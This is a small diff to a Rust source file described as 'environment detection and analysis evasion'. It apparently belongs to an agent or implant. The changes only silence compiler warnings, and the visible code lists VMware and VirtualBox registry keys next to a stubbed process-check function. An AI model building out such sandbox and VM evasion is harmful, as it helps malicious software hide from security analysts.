@@ -1,4 +1,4 @@
-// src/agent/environment.rs - Environment detection and analysis evasion (~100 lines)
+// src/agent/environment.rs - FIXED: Environment detection and analysis evasion
 use std::time::Instant;
 use std::path::Path;
 
@@ -106,7 +106,7 @@ impl EnvironmentChecker {
     fn check_registry_vm_keys() -> bool {
         #[cfg(windows)]
         {
-            let vm_keys = vec![
+            let _vm_keys = vec![
                 r"SYSTEM\ControlSet001\Services\Disk\Enum",
                 r"SOFTWARE\VMware, Inc.\VMware Tools",
                 r"SOFTWARE\Oracle\VirtualBox Guest Additions",
@@ -140,7 +140,8 @@ impl EnvironmentChecker {
         false // Simplified
     }
     
-    fn check_running_processes(process_names: &[&str]) -> bool {
+    // FIXED: prefixed unused parameter with underscore
+    fn check_running_processes(_process_names: &[&str]) -> bool {
         // Implementation would enumerate running processes
         // and check against the suspicious list
         false // Simplified
